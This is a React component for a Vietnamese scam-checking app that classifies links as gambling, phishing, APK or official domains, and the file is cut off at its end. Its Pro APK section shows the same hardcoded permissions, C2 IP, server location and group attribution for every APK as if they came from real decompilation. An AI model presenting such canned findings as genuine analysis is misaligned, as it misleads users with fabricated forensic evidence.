import React, { useState } from 'react';
import {
  Radio,
  FileCode,
  Lock,
  Terminal,
  Activity,
  AlertTriangle,
  CheckCircle2,
  ExternalLink,
  ChevronRight,
  Crown,
  KeyRound,
  ShieldCheck,
  Zap,
  Flag,
  Users,
  ShieldAlert,
  ClipboardPaste,
  OctagonAlert,
} from 'lucide-react';
import { PersonaMode, AnalysisPreset, QVAIResult } from '../../types';
import { PRESET_LINKS } from '../../data/presets';
import { useAccount } from '../../context/AccountContext';
import { useIntelligence } from '../../context/IntelligenceContext';
import { analyzeQVAIWithWebsiteEvidence } from '../../services/qvAiService';
import { normalizeLink } from '../../services/intelligenceService';

interface LinkApkTabProps {
  persona: PersonaMode;
  onOpenLicense: () => void;
  onOpenReport?: (type: 'link', value: string, category: string) => void;
}

export const LinkApkTab: React.FC<LinkApkTabProps> = ({ persona, onOpenLicense, onOpenReport }) => {
  const { isPro, consumeQuota, account } = useAccount();
  const { findIntelligence, entries } = useIntelligence();

  const [qvAiResult, setQvAiResult] = useState<QVAIResult | null>(null);
  const [qvAiAnalyzing, setQvAiAnalyzing] = useState(false);

  const [linkInput, setLinkInput] = useState('https://www.jun88wl.com/');
  const [linkResult, setLinkResult] = useState<AnalysisPreset>({
    label: 'Cổng cờ bạc Jun88',
    url: 'https://www.jun88wl.com/',
    level: 'CỜ BẠC & CÁ ĐỘ TRỰC TUYẾN BẤT HỢP PHÁP — RỦI RO CAO',
    color: 'border-red-600 bg-red-950/40 text-red-300',
    badge: 'bg-red-600 text-white',
    vector: 'Cổng game cá cược, casino online, đá gà & nạp tiền ẩn danh xuyên biên giới',
    desc: 'Tên miền thuộc mạng lưới cờ bạc trực tuyến Jun88 đặt máy chủ tại nước ngoài, liên tục đổi tên miền phụ để né tránh chặn lọc từ các nhà mạng Việt Nam. Bị cấm theo Điều 321 & Điều 322 Bộ luật Hình sự.',
    action: 'TUYỆT ĐỐI KHÔNG ĐĂNG KÝ, KHÔNG NẠP TIỀN. Nguy cơ bị chiếm đoạt toàn bộ tiền cược và vi phạm pháp luật hình sự!',
  });
  const [showPaywallAlert, setShowPaywallAlert] = useState(false);

  const handlePasteClipboard = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text && text.trim()) {
        setLinkInput(text.trim());
        handleAnalyze(text.trim());
      }
    } catch {
      // ignore
    }
  };

  // Check community intelligence
  const currentIntel = findIntelligence('link', linkResult.url);

  const handleAnalyze = async (targetUrl?: string) => {
    const url = (targetUrl || linkInput).trim();
    if (!url) return;

    if (!consumeQuota()) {
      setShowPaywallAlert(true);
      return;
    }

    setLinkInput(url);
    setQvAiResult(null);
    setQvAiAnalyzing(true);
    const lower = url.toLowerCase();

    // 1. Check intelligence database first
    const intel = findIntelligence('link', url);

    // 2. Check gambling keywords
    // Detect gambling by behavior/category signals, not by a single brand name.
    const gamblingSignals = [
      'jun88', 'hi88', 'new88', 'f8bet', '789club', 'go88', 'sunwin',
      'kubet', 'thabet', 'w88', 'fun88', 'bk8', 'shbet',
      'casino', 'gambling', 'betting', 'sportsbet', 'taixiu',
      'keonhacai', 'ca cuoc', 'ca-cuoc', 'ca-cuoc-truc-tuyen',
      'dat cuoc', 'dat-cuoc', 'nha cai', 'nha-cai', 'jackpot',
      'slot', 'poker', 'game bai', 'game-bai', 'no hu', 'no-hu',
      'nap tien', 'nap-tien', 'rut tien', 'rut-tien',
    ];
    const isGambling = gamblingSignals.some((signal) => lower.includes(signal));

    const normalizedHost = normalizeLink(url);

    // 3. Check official domains by hostname, not substring.
    const officialDomains = [
      'google.com',
      'dichvucong.gov.vn',
      'chinhphu.vn',
      'vietcombank.com.vn',
      'highlandscoffee.com.vn',
      'zalo.me',
      'facebook.com',
    ];

    const isOfficialDomain = officialDomains.some(
      (domain) =>
        normalizedHost === domain ||
        normalizedHost.endsWith(`.${domain}`)
    );

    const isVerifiedSafe =
      isOfficialDomain &&
      !lower.includes('.apk');

    // 4. APK is a file type, not proof of malware.
    const isApk = lower.includes('.apk');

    // 5. Check fake gov / bank phishing using the hostname.
    const impersonationTerms = [
      'dichvucong',
      'smartbanking',
      'nganhang',
      'bocongan',
    ];

    const isPhishing =
      impersonationTerms.some((term) => normalizedHost.includes(term)) &&
      !normalizedHost.endsWith('.gov.vn') &&
      !normalizedHost.endsWith('.com.vn');

    if (intel) {
      setLinkResult({
        label: intel.category,
        url: url,
        level: `${intel.category} — Điểm rủi ro: ${intel.threatScore}/100`,
        color:
          intel.threatLevel === 'CRITICAL'
            ? 'border-red-600 bg-red-950/40 text-red-300'
            : 'border-amber-600 bg-amber-950/40 text-amber-300',
        badge: intel.threatLevel === 'CRITICAL' ? 'bg-red-600 text-white' : 'bg-amber-600 text-white',
        vector: `Đã có ${intel.reportsCount} lượt tố giác từ cộng đồng với tổng thiệt hại ước tính ${(
          intel.totalLossReported / 1000000
        ).toFixed(0)} triệu VNĐ`,
        desc: intel.advice,
        action: intel.legalBasis,
      });
    } else if (isGambling) {
      setLinkResult({
        label: 'Cổng cờ bạc & cá cược lậu',
        url: url,
        level: 'CỜ BẠC & CÁ ĐỘ TRỰC TUYẾN BẤT HỢP PHÁP — RỦI RO CAO',
        color: 'border-red-600 bg-red-950/40 text-red-300',
        badge: 'bg-red-600 text-white',
        vector: 'Nhà cái cá cược bóng đá, casino trực tuyến, game bài đổi thưởng xuyên biên giới',
        desc: 'Hệ thống nhận diện tên miền thuộc mạng lưới cờ bạc trực tuyến không có giấy phép tại Việt Nam. Sử dụng cổng thanh toán trung gian rửa tiền qua ngân hàng ảo và tiền số USDT.',
        action: 'TUYỆT ĐỐI KHÔNG NẠP TIỀN. Tham gia đánh bạc trực tuyến vi phạm Điều 321 Bộ luật Hình sự Việt Nam.',
      });
    } else if (isApk) {
      setLinkResult({
        label: 'Tệp cài đặt Android (.APK) — cần cảnh giác',
        url: url,
        level: 'CẢNH BÁO TỆP APK — CẦN PHÂN TÍCH',
        color: 'border-red-600 bg-red-950/40 text-red-300',
        badge: 'bg-red-600 text-white',
        vector: 'Tệp .APK có thể chứa mã độc và cần được phân tích nguồn gốc, chữ ký và hành vi trước khi cài đặt',
        desc: 'Kẻ gian thường giả danh cơ quan Công an hướng dẫn cài đặt app Dịch vụ công hoặc Ngân hàng bằng file .apk này để chiếm đoạt hoàn toàn quyền điều khiển điện thoại từ xa.',
        action: 'TUYỆT ĐỐI KHÔNG CÀI ĐẶT. Nếu đã lỡ cài đặt, bật ngay Chế độ máy bay (Airplane Mode) và mang máy ra trung tâm bảo hành để chạy lại phần mềm!',
      });
    } else if (isPhishing) {
      setLinkResult({
        label: 'Trang web mạo danh cơ quan / ngân hàng',
        url: url,
        level: 'CẢNH BÁO PHISHING ĐÁNH CẮP TÀI KHOẢN — RỦI RO CAO',
        color: 'border-amber-600 bg-amber-950/40 text-amber-300',
        badge: 'bg-amber-600 text-white',
        vector: 'Giao diện nhái trang đăng nhập ngân hàng hoặc dịch vụ công nhà nước',
        desc: 'Tên miền không thuộc cơ quan nhà nước (.gov.vn) hay ngân hàng chính thức (.com.vn). Kẻ gian dùng để thu thập mật khẩu, CCCD và mã OTP giao dịch.',
        action: 'Không nhập bất kỳ thông tin cá nhân hay mật khẩu nào trên trang web này.',
      });
    } else if (isVerifiedSafe) {
      setLinkResult({
        label: 'Tên miền chính thống xác thực',
        url: url,
        level: 'TÊN MIỀN KHỚP DANH SÁCH CHÍNH THỐNG — CẦN XÁC MINH',
        color: 'border-emerald-600 bg-emerald-950/40 text-emerald-300',
        badge: 'bg-emerald-600 text-white',
        vector: 'Cổng thông tin / Dịch vụ trực tuyến chính thức có chứng chỉ SSL hợp lệ',
        desc: 'Tên miền đã được đối soát với danh bạ định danh tổ chức hợp pháp tại Việt Nam và quốc tế.',
        action: 'Được phép truy cập an toàn. Lưu ý luôn kiểm tra thanh địa chỉ trình duyệt hiển thị đúng tên miền.',
      });
    } else {
      setLinkResult({
        label: 'Tên miền chưa có trong danh sách đen',
        url: url,
        level: 'CHƯA CÓ ĐỐI SÁNH TÌNH BÁO — CẦN CẢNH GIÁC',
        color: 'border-blue-600 bg-blue-950/40 text-blue-300',
        badge: 'bg-blue-600 text-white',
        vector: 'Kiểm tra đuôi tệp và chứng chỉ máy chủ DNS',
        desc: 'Tên miền chưa từng bị phản ánh trong cơ sở dữ liệu gian lận. Tuy nhiên vẫn cần cảnh giác nếu website yêu cầu nạp tiền hoặc tải tệp lạ.',
        action: 'Thận trọng không nhập mật khẩu, mã OTP hay chuyển tiền nếu chưa xác thực rõ nguồn gốc.',
      });
    }

    const existingRiskScore =
      intel?.threatScore ??
      (isGambling ? 98 : isPhishing ? 95 : isApk ? 80 : isVerifiedSafe ? 5 : 20);

    try {
      const qvResult = await analyzeQVAIWithWebsiteEvidence(
        {
          type: 'url',
          value: url,
          metadata: {
            existingRiskScore,
            existingLabel: intel?.category || (
              isGambling
                ? 'Cờ bạc / cá cược'
                : isPhishing
                  ? 'Phishing'
                  : isApk
                    ? 'Tệp APK cần phân tích'
                    : isVerifiedSafe
                      ? 'Tên miền khớp danh sách chính thống'
                      : 'Chưa có đối sánh tình báo'
            ),
            isOfficialDomain,
            isGambling,
            isPhishing,
            isApk,
            isBaselineSignal: !intel && !isGambling && !isPhishing && !isApk && !isVerifiedSafe,
          },
        },
        {
          intelligence: entries,
        }
      );

      setQvAiResult(qvResult);
    } finally {
      setQvAiAnalyzing(false);
    }
  };

  const isApk = linkResult.url.toLowerCase().includes('.apk');

  return (
    <div className="space-y-6">
      {/* PAYWALL NOTIFICATION FOR QUOTA EXHAUSTION */}
      {showPaywallAlert && (
        <div className="bg-gradient-to-r from-amber-950/80 via-slate-900 to-amber-950/80 border border-amber-500/50 p-4 rounded-2xl flex flex-col sm:flex-row items-center justify-between gap-4 shadow-xl">
          <div className="flex items-center gap-3 text-amber-300 text-xs sm:text-sm">
            <AlertTriangle className="w-5 h-5 flex-shrink-0 text-amber-400" />
            <span>
              Bạn đã sử dụng hết <strong>{account.dailyQuotaMax} lượt quét miễn phí</strong> trong ngày. Nâng cấp hoặc nhập License Key để tiếp tục điều tra không giới hạn!
            </span>
          </div>
          <button
            onClick={onOpenLicense}
            className="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold px-4 py-2 rounded-xl text-xs flex items-center gap-1.5 cursor-pointer flex-shrink-0 shadow-md"
          >
            <Crown className="w-4 h-4" />
            <span>Kích Hoạt Bản Quyền Pro</span>
          </button>
        </div>
      )}

      {/* INPUT CARD */}
      <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800 shadow-xl space-y-4">
        <div className="flex items-start gap-4">
          <div className="p-3 bg-teal-500/10 rounded-xl border border-teal-500/20 text-teal-400">
            <Radio className="w-7 h-7 animate-pulse" />
          </div>
          <div>
            <h2 className="text-lg sm:text-xl font-bold text-white">
              {persona === 'elderly'
                ? 'Kiểm Tra Đường Link, Web Cờ Bạc & Ứng Dụng Lạ'
                : 'Kiểm Tra Trang Web Độc Hại & Tệp Cài Đặt Điện Thoại (.APK)'}
            </h2>
            <p className="text-xs sm:text-sm text-slate-400 mt-1">
              {persona === 'elderly'
                ? 'Bác nhận được link lạ qua Zalo/Facebook bảo cài ứng dụng Dịch vụ công, chơi game hay đánh cược? Dán vào đây để kiểm tra ngay!'
                : 'Nhận diện trang web lừa đảo, web cờ bạc lậu (Jun88, New88...), app giả mạo Dịch vụ công/VNeID chiếm quyền điều khiển điện thoại.'}
            </p>
          </div>
        </div>

        {/* QUICK PRESETS */}
        <div className="flex flex-wrap gap-2 pt-2">
          <span className="text-xs text-slate-400 font-medium py-1">Mẫu thử nghiệm thực tế:</span>
          <button
            onClick={() => handleAnalyze('https://www.jun88wl.com/')}
            className="text-xs bg-slate-900 hover:bg-slate-800 text-red-300 border border-red-500/40 px-3 py-1.5 rounded-lg transition-all cursor-pointer font-semibold flex items-center gap-1"
          >
            <span>🎰</span>
            <span>Jun88 (Cờ bạc / Cá cược online)</span>
          </button>

          <button
            onClick={() => handleAnalyze('http://dichvucong-chinhphu.site/dvc.apk')}
            className="text-xs bg-slate-900 hover:bg-slate-800 text-rose-300 border border-rose-500/40 px-3 py-1.5 rounded-lg transition-all cursor-pointer font-semibold flex items-center gap-1"
          >
            <span>☣️</span>
            <span>Mã độc Dịch Vụ Công (.APK)</span>
          </button>

          <button
            onClick={() => handleAnalyze('https://dichvucong.gov.vn')}
            className="text-xs bg-slate-900 hover:bg-slate-800 text-emerald-300 border border-emerald-500/40 px-3 py-1.5 rounded-lg transition-all cursor-pointer font-semibold flex items-center gap-1"
          >
            <span>🏛️</span>
            <span>Cổng Dịch Vụ Công Quốc Gia (Chính thức)</span>
          </button>

          <button
            onClick={() => handleAnalyze('https://www.highlandscoffee.com.vn/')}
            className="text-xs bg-slate-900 hover:bg-slate-800 text-blue-300 border border-blue-500/40 px-3 py-1.5 rounded-lg transition-all cursor-pointer font-semibold flex items-center gap-1"
          >
            <span>☕</span>
            <span>Highlands Coffee (Chính thức)</span>
          </button>
        </div>

        {/* INPUT BOX */}
        <div className="flex flex-col sm:flex-row gap-2 pt-2">
          <input
            type="text"
            value={linkInput}
            onChange={(e) => setLinkInput(e.target.value)}
            placeholder="Dán đường link web hoặc link tải tệp .apk khả nghi (VD: jun88wl.com)..."
            className="flex-1 bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-xs sm:text-sm text-white placeholder-slate-500 focus:outline-none focus:border-teal-500 font-mono"
          />
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={handlePasteClipboard}
              className="bg-slate-800 hover:bg-slate-700 text-slate-200 hover:text-white font-bold px-4 py-3 rounded-xl text-xs sm:text-sm transition-all cursor-pointer border border-slate-700 flex items-center gap-2 active:scale-95"
              title="Dán nhanh liên kết từ bộ nhớ tạm"
            >
              <ClipboardPaste className="w-4 h-4 text-amber-400" />
              <span>Dán Nhanh</span>
            </button>
            <button
              onClick={() => handleAnalyze()}
              className="bg-teal-600 hover:bg-teal-500 text-white font-bold px-6 py-3 rounded-xl text-xs sm:text-sm transition-all cursor-pointer shadow-lg shadow-teal-600/20 flex items-center justify-center gap-2 active:scale-95"
            >
              <Activity className="w-4 h-4" />
              <span>Kiểm Tra Link Này</span>
            </button>
          </div>
        </div>
      </div>

      {/* COMMUNITY INTELLIGENCE ALERT BANNER IF TARGET IS REPORTED */}
      {currentIntel && currentIntel.reportsCount > 0 && (
        <div className="bg-gradient-to-r from-red-950/80 via-slate-900 to-red-950/80 border-2 border-red-500/50 p-5 rounded-2xl shadow-xl space-y-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 text-red-400 font-bold text-sm">
              <Users className="w-5 h-5 text-red-400 animate-pulse" />
              <span>CẢNH BÁO TỐ GIÁC TRÙNG LẶP: ĐÃ CÓ {currentIntel.reportsCount} LƯỢT TỐ CÁO TRÊN HỆ THỐNG!</span>
            </div>
            <span className="text-xs bg-red-600 text-white font-bold px-2.5 py-0.5 rounded-full font-mono">
              DANH SÁCH ĐEN
            </span>
          </div>

          <p className="text-xs text-slate-300 leading-relaxed">
            Tổng số tiền thiệt hại lũy kế được các nạn nhân báo cáo:{' '}
            <strong className="text-amber-300 font-mono text-sm">
              {currentIntel.totalLossReported.toLocaleString('vi-VN')} VND
            </strong>
          </p>

          <div className="space-y-1.5 pt-1">
            <span className="text-xs font-bold text-slate-400">Các góc độ thủ đoạn đã ghi nhận:</span>
            <ul className="space-y-1 text-xs text-slate-300">
              {currentIntel.angles.map((ang, i) => (
                <li key={i} className="flex items-start gap-2 bg-slate-950/60 p-2 rounded-lg border border-slate-800">
                  <span className="text-red-400 font-bold">•</span>
                  <span>{ang}</span>
                </li>
              ))}
            </ul>
          </div>
        </div>
      )}

      {/* RESULT REPORT */}
      <div className={`rounded-2xl border ${linkResult.color} p-5 sm:p-6 space-y-5 shadow-2xl bg-slate-950`}>
        {/* 1. ĐÈN GIAO THÔNG 3 GIÂY CHO LINK / WEB */}
        {linkResult.badge.includes('red') || linkResult.level.includes('CỜ BẠC') || linkResult.level.includes('ĐỘC') ? (
          <div className="bg-gradient-to-r from-red-600 via-rose-600 to-red-700 text-white p-4 rounded-xl shadow-lg flex items-center gap-3.5 animate-in zoom-in-95 duration-200">
            <div className="p-2 bg-white/20 rounded-xl shrink-0">
              <OctagonAlert className="w-7 h-7 text-white animate-bounce" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-[10px] bg-black/40 px-2 py-0.5 rounded-full font-bold text-red-200">
                  ĐÈN ĐỎ NGUY HIỂM
                </span>
                <span className="text-xs font-bold text-red-100">Điểm rủi ro: {qvAiResult?.threatScore ?? 0}/100</span>
              </div>
              <h4 className="text-base sm:text-lg font-black uppercase tracking-tight mt-0.5">
                TRANG WEB LỪA ĐẢO / CỜ BẠC / MÃ ĐỘC — TUYỆT ĐỐI KHÔNG BẤM!
              </h4>
              <p className="text-xs text-red-100 mt-0.5">
                Không đăng nhập tài khoản ngân hàng, không tải file .apk, không nạp tiền đặt cược!
              </p>
            </div>
          </div>
        ) : linkResult.badge.includes('amber') ? (
          <div className="bg-gradient-to-r from-amber-600 via-yellow-600 to-amber-700 text-slate-950 p-4 rounded-xl shadow-lg flex items-center gap-3.5 animate-in zoom-in-95 duration-200">
            <div className="p-2 bg-black/10 rounded-xl shrink-0">
              <AlertTriangle className="w-7 h-7 text-slate-950" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-[10px] bg-black/20 px-2 py-0.5 rounded-full font-bold text-slate-950">
                  ĐÈN VÀNG CẢNH GIÁC
                </span>
                <span className="text-xs font-bold text-slate-900">Chưa được xác minh uy tín</span>
              </div>
              <h4 className="text-base sm:text-lg font-black uppercase tracking-tight mt-0.5">
                CẨN TRỌNG — TÊN MIỀN LẠ CÓ NGUY CƠ GIẢ MẠO
              </h4>
            </div>
          </div>
        ) : linkResult.badge.includes('emerald') ? (
          <div className="bg-gradient-to-r from-emerald-600 via-teal-600 to-emerald-700 text-white p-4 rounded-xl shadow-lg flex items-center gap-3.5 animate-in zoom-in-95 duration-200">
            <div className="p-2 bg-white/20 rounded-xl shrink-0">
              <CheckCircle2 className="w-7 h-7 text-white" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-[10px] bg-black/30 px-2 py-0.5 rounded-full font-bold text-emerald-200">
                  KHỚP DOMAIN ĐÃ XÁC MINH
                </span>
                <span className="text-xs font-bold text-emerald-100">Khớp danh sách domain chính thức</span>
              </div>
              <h4 className="text-base sm:text-lg font-black uppercase tracking-tight mt-0.5">
                DOMAIN KHỚP DANH SÁCH CHÍNH THỨC — VẪN CẦN KIỂM TRA URL CỤ THỂ
              </h4>
            </div>
          </div>
        ) : null}

        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
          <div>
            <span className="text-xs font-mono text-slate-400 font-bold uppercase tracking-wider block">
              LIÊN KẾT ĐANG KIỂM TRA:
            </span>
            <h3 className="text-base sm:text-lg font-black text-white mt-1 break-all font-mono">
              {linkResult.url}
            </h3>
          </div>
          <div className="flex items-center gap-2">
            <span className={`text-xs font-black px-3.5 py-1.5 rounded-lg uppercase tracking-wider ${linkResult.badge}`}>
              {linkResult.level}
            </span>
            {onOpenReport && (
              <button
                onClick={() => onOpenReport('link', linkResult.url, linkResult.label)}
                className="bg-red-950/60 hover:bg-red-900/60 text-red-300 border border-red-500/40 text-xs font-bold px-3 py-1.5 rounded-lg flex items-center gap-1.5 cursor-pointer transition-all"
                title="Gửi báo cáo tố giác trang web này"
              >
                <Flag className="w-3.5 h-3.5 text-red-400" />
                <span>Tố Giác Link Này</span>
              </button>
            )}
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs sm:text-sm">
          <div className="bg-slate-900/90 p-4 rounded-xl border border-slate-800 space-y-1">
            <span className="text-xs font-bold text-slate-400 uppercase">Dấu Hiệu &amp; Thủ Đoạn Nhận Biết:</span>
            <p className="text-white font-semibold">{linkResult.vector}</p>
          </div>
          <div className="bg-slate-900/90 p-4 rounded-xl border border-slate-800 space-y-1">
            <span className="text-xs font-bold text-slate-400 uppercase">Lời Dặn An Toàn Tức Thì:</span>
            <p className="text-amber-300 font-semibold">{linkResult.action}</p>
          </div>
        </div>

        <div className="bg-slate-900/60 p-4 rounded-xl border border-slate-800">
          <span className="text-xs font-bold text-slate-400 uppercase block mb-1">Mô Tả Chi Tiết Nguy Cơ:</span>
          <p className="text-slate-300 text-xs sm:text-sm leading-relaxed">{linkResult.desc}</p>
        </div>

        {/* QV AI - TỔNG HỢP LINK/APK */}
        {qvAiAnalyzing && (
          <div className="p-5 rounded-xl bg-slate-950 border border-cyan-500/30">
            <div className="text-[11px] font-black uppercase tracking-wider text-cyan-400">
              QV AI — Đang thu thập bằng chứng website...
            </div>
            <div className="text-xs text-slate-400 mt-1">
              Kiểm tra cấu trúc URL, nội dung trang và các tín hiệu đăng nhập/thanh toán nếu website cho phép truy cập dữ liệu.
            </div>
          </div>
        )}
        {qvAiResult && (
          <div className="p-5 rounded-xl bg-slate-950 border border-cyan-500/30 space-y-4">
            <div className="flex items-center justify-between gap-3">
              <div>
                <div className="text-[11px] font-black uppercase tracking-wider text-cyan-400">
                  QV AI — Phân tích tổng hợp Link/APK
                </div>
                <div className="text-xs text-slate-400 mt-1">
                  Tổng hợp tình báo và các tín hiệu của bộ phân tích Link/APK
                </div>
              </div>
              <div className="text-right">
                <div className="text-2xl font-black text-white">{qvAiResult.threatScore}/100</div>
                <div className="text-[10px] font-bold text-slate-500 uppercase">{qvAiResult.threatLevel}</div>
              </div>
            </div>
            <div className="bg-slate-900/70 rounded-xl p-3 border border-slate-800 text-xs text-slate-200 leading-relaxed">
              {qvAiResult.summary}
            </div>
            {qvAiResult.evidence.length > 0 && (
              <div className="space-y-2">
                <div className="text-[10px] font-black uppercase tracking-wider text-slate-500">Bằng chứng</div>
                {qvAiResult.evidence.slice(0, 4).map((item, index) => (
                  <div key={`${item.source}-${item.label}-${index}`} className="bg-slate-900/60 rounded-lg p-3 border border-slate-800">
                    <div className="text-xs font-bold text-white">{item.label}</div>
                    <div className="text-[11px] text-slate-400 mt-1">{item.detail}</div>
                    <div className="text-[10px] text-slate-600 mt-1">Nguồn: {item.source}</div>
                  </div>
                ))}
              </div>
            )}
            <div>
              <div className="text-[10px] font-black uppercase tracking-wider text-slate-500 mb-1">Khuyến nghị</div>
              {qvAiResult.recommendedActions.slice(0, 3).map((action, index) => (
                <div key={`${action}-${index}`} className="text-xs text-slate-300 leading-relaxed">• {action}</div>
              ))}
            </div>
          </div>
        )}

        {/* NATIONAL REGULATORY VERIFICATION (VNNIC & NCSC - BỘ TT&TT) */}
        <div className="p-5 rounded-xl bg-gradient-to-r from-slate-900 via-slate-950 to-slate-900 border border-teal-500/30 space-y-3">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2.5">
            <div className="flex items-center gap-2">
              <ShieldCheck className="w-5 h-5 text-teal-400" />
              <span className="text-xs font-mono font-bold text-teal-300 uppercase tracking-wide">
                ĐỐI CHIẾU THÔNG TIN TÊN MIỀN
              </span>
            </div>
            <span className="text-[11px] font-mono text-slate-400">
              Cổng tra cứu: <strong className="text-white">tracuutenmien.gov.vn</strong> • Tổng đài <strong>156 (Nhánh 2)</strong>
            </span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
            <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 space-y-1">
              <span className="text-slate-400 block text-[11px]">ĐUÔI TÊN MIỀN:</span>
              <div className="font-bold text-white font-mono">
                {linkResult.url.includes('.gov.vn') ? (
                  <span className="text-emerald-400 flex items-center gap-1">
                    <CheckCircle2 className="w-3.5 h-3.5" /> .GOV.VN (Cơ quan Nhà nước)
                  </span>
                ) : linkResult.url.includes('.com.vn') || linkResult.url.includes('.vn') ? (
                  <span className="text-cyan-300 flex items-center gap-1">
                    <CheckCircle2 className="w-3.5 h-3.5" /> .VN (Doanh nghiệp trong nước)
                  </span>
                ) : (
                  <span className="text-red-400 flex items-center gap-1">
                    <AlertTriangle className="w-3.5 h-3.5" /> Đuôi quốc tế / Không kiểm duyệt
                  </span>
                )}
              </div>
              <p className="text-[11px] text-slate-400">
                {linkResult.url.includes('.gov.vn')
                  ? 'Bộ TT&TT chỉ cấp đuôi .gov.vn cho cơ quan hành chính Nhà nước'
                  : 'Trang web không có chứng thư số cơ quan Nhà nước Việt Nam'}
              </p>
            </div>

            <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 space-y-1">
              <span className="text-slate-400 block text-[11px]">THỜI GIAN HOẠT ĐỘNG:</span>
              <div className="font-bold font-mono">
                <span className="text-slate-300">Chưa có dữ liệu tuổi tên miền</span>
              </div>
              <p className="text-[11px] text-slate-400">
                Không suy đoán tuổi tên miền khi chưa có dữ liệu WHOIS/đăng ký thực tế.
              </p>
            </div>

            <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 space-y-1">
              <span className="text-slate-400 block text-[11px]">CHỨNG NHẬN AN TOÀN QUỐC GIA (NCSC):</span>
              <div className="font-bold font-mono">
                <span className="text-amber-400 flex items-center gap-1">
                  <AlertTriangle className="w-3.5 h-3.5" /> Chưa kết nối tra cứu NCSC trực tiếp
                </span>
              </div>
              <p className="text-[11px] text-slate-400">
                Nhắn tin kiểm tra miễn phí: <strong className="text-amber-300 font-mono">TCDNS [Tên_Miền] gửi 156</strong>
              </p>
            </div>
          </div>
        </div>

        {/* PRO FEATURE: APK SANDBOX REVERSE ENGINEERING */}
        {isApk && (
          <div className="mt-6 pt-6 border-t border-slate-800 space-y-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <FileCode className="w-5 h-5 text-teal-400" />
                <h4 className="text-sm sm:text-base font-bold text-white uppercase tracking-wide">
                  Phân Tích Bóc Tách Mã Độc Sandbox (APK Manifest Analysis)
                </h4>
              </div>
              <span className="text-xs font-mono font-bold px-2.5 py-1 rounded bg-teal-500/20 text-teal-300 border border-teal-500/30">
                {isPro ? 'PRO UNLOCKED' : 'PRO FEATURE'}
              </span>
            </div>

            {isPro ? (
              <div className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {/* Android Permissions Breakdown */}
                  <div className="bg-slate-900 p-4 rounded-xl border border-red-500/40 space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-red-400 uppercase font-mono">
                        4 QUYỀN TRUY CẬP TỐI NGUY HIỂM:
                      </span>
                      <span className="text-[10px] bg-red-600/30 text-red-300 px-2 py-0.5 rounded font-mono">
                        CRITICAL
                      </span>
                    </div>
                    <ul className="space-y-2 text-xs">
                      <li className="p-2 rounded bg-red-950/40 border border-red-900/50">
                        <strong className="text-red-300 font-mono block">android.permission.BIND_ACCESSIBILITY_SERVICE</strong>
                        <span className="text-slate-400">
                          Chiếm quyền trợ năng, tự động đọc mã PIN và tự chạm màn hình để chuyển tiền ngầm lúc nửa đêm.
                        </span>
                      </li>
                      <li className="p-2 rounded bg-red-950/40 border border-red-900/50">
                        <strong className="text-red-300 font-mono block">android.permission.RECEIVE_SMS & READ_SMS</strong>
                        <span className="text-slate-400">
                          Đọc ngầm tin nhắn OTP ngân hàng và tự động xóa SMS để nạn nhân không phát hiện biến động số dư.
                        </span>
                      </li>
                      <li className="p-2 rounded bg-red-950/40 border border-red-900/50">
                        <strong className="text-red-300 font-mono block">android.permission.SYSTEM_ALERT_WINDOW</strong>
                        <span className="text-slate-400">
                          Vẽ giao diện giả mạo đè lên màn hình thật (Overlay Attack) để đánh cắp mật khẩu đăng nhập SmartBanking.
                        </span>
                      </li>
                    </ul>
                  </div>

                  {/* C2 Command & Control Server */}
                  <div className="bg-slate-900 p-4 rounded-xl border border-teal-500/30 space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-teal-300 uppercase font-mono">
                        ĐỊNH VỊ MÁY CHỦ ĐIỀU KHIỂN (C2 SERVER):
                      </span>
                      <span className="text-[10px] bg-teal-500/20 text-teal-300 px-2 py-0.5 rounded font-mono">
                        TRACKED
                      </span>
                    </div>
                    <div className="space-y-2 text-xs font-mono">
                      <div className="p-2 bg-slate-950 rounded border border-slate-800 flex justify-between">
                        <span className="text-slate-400">Địa chỉ C2 IP:</span>
                        <span className="text-amber-300">103.145.22.89 (Port 8443 WSS)</span>
                      </div>
                      <div className="p-2 bg-slate-950 rounded border border-slate-800 flex justify-between">
                        <span className="text-slate-400">Vị trí địa lý máy chủ:</span>
                        <span className="text-rose-400">Bavet, Svay Rieng, Campuchia</span>
                      </div>
                      <div className="p-2 bg-slate-950 rounded border border-slate-800 flex justify-between">
                        <span className="text-slate-400">Giao thức ngầm:</span>
                        <span className="text-teal-300">Encrypted WebSocket Heartbeat (30s)</span>
                      </div>
                      <div className="p-2 bg-slate-950 rounded border border-slate-800 flex justify-between">
                        <span className="text-slate-400">Nhóm đối tượng:</span>
                        <span className="text-red-400 font-semibold">Tổ chức lừa đảo viễn thông xuyên biên giới</span>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Disassembled Payload Preview */}
                <div className="bg-slate-900 p-4 rounded-xl border border-slate-800">
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-xs font-mono text-slate-400 font-bold">
                      TRÍCH XUẤT ĐOẠN MÃ ĐỘC PHÂN TÍCH (DECOMPILED SMALI CODE):
                    </span>
                    <span className="text-[10px] font-mono text-slate-500">Auto-Decompiled by VeraFense Core</span>
                  </div>
                  <pre className="p-3 bg-slate-950 rounded-lg text-[11px] font-mono text-teal-400 overflow-x-auto border border-slate-800">
